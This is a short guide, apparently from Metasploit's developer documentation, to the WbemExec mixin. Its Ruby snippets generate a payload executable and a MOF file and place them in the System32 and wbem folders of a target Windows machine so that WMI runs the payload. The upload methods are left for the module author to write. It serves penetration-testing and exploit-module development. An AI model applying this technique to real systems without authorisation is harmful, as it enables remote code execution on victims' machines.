### Requirements
To to able to use the
```WBemExec```

### Usage
First, include the
```WbemExec```

mixin under the scope of your
```MetasploitModule```

class. You will also need the
```EXE```

mixin to generate an executable:
```ruby
include Msf::Exploit::EXE
include Msf::Exploit::WbemExec
```

Next, generate a payload name and the executable:
```ruby
payload_name = "evil.exe"
exe = generate_payload_exe
```

And then generate the mof file using the
```generate_mof```

method. The first argument should be the name of the mof file, and the second argument is the payload name:
```ruby
mof_name = "evil.mof"
mof = generate_mof(mof_name, payload_name)
```

Now you're ready to write/upload your files to the target machine. Always make sure you upload the payload executable first to
```C:\Windows\System32\```

.
```ruby
upload_file_to_system32(payload_name, exe) # Write your own upload method
```

And then now you can upload the mof file to
```C:\Windows\System32\wbem\```

:
```ruby
upload_mof(mof_name, mof) # Write your own upload method
```

